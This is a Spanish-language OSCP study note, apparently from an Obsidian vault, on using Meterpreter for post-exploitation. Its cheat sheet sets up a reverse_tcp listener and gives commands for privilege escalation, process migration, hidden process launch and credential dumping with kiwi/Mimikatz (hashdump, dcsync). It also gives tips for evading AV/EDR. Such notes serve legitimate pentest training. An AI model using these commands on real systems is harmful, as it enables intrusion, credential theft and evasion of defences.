---
tipo: tecnica
fase: post-explotacion
so: windows
tags: [oscp, tecnica, post-explotacion, windows, linux]
---

# Meterpreter

> [!abstract] Qué es y cuándo usarla
> Payload avanzado de Metasploit que vive **en memoria**, cifra su comunicación y se extiende en runtime. Da muchas más capacidades que una shell cruda: transferencia de ficheros, pivoting, elevación, dump de credenciales. Úsalo en la fase de **post-explotación**, preferiblemente **después** de tener foothold/evasión (los AV lo detectan mucho).

## Requisitos previos
- Metasploit con `multi/handler` escuchando el **mismo** payload (Meterpreter es staged → Netcat no sirve).
- La variante Windows tiene más features post que la Linux.

## Pasos
```text
# recibir la sesión (ver [[msfvenom]] para generar el ejecutable)
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <ip> ; set LPORT 443 ; run

# información y navegación
sysinfo ; getuid ; idletime ; help
ps ; getpid
shell                      # shell nativa en un "channel" (Ctrl+Z -> background)
channel -l ; channel -i <id>

# ficheros (prefijo l = local en Kali: lcd, lpwd, lls)
download <ruta_remota> ; upload <ruta_local> <ruta_remota>   # Windows: escapar \\

# elevación y sigilo
getsystem                  # -> NT AUTHORITY\SYSTEM (SeImpersonate/SeDebug)
migrate <PID>              # mover a otro proceso (igual o menor integridad)
execute -H -f notepad      # lanzar proceso oculto para migrar a él

# credenciales (requiere SYSTEM)
load kiwi ; creds_msv      # Mimikatz: creds_all, lsa_dump_sam, dcsync, hashdump
```

> [!tip] `meterpreter_reverse_https` camufla la comunicación como HTTPS (el endpoint devuelve 404 en navegador). `_tcp` inline = non-staged; `/reverse_tcp` = staged.

> [!warning] Detección / problemas
> - Ratios de detección altos en AV/EDR → obtén el foothold con shell TCP cruda y despliega Meterpreter después.
> - En el **examen OSCP** el uso de Metasploit/Meterpreter está **limitado a una máquina**.
> - `migrate` falla con "undefined method pid" → actualiza Metasploit.

## Visto en
- Módulo: [[21 - The Metasploit Framework]]
- Máquinas: [[]]
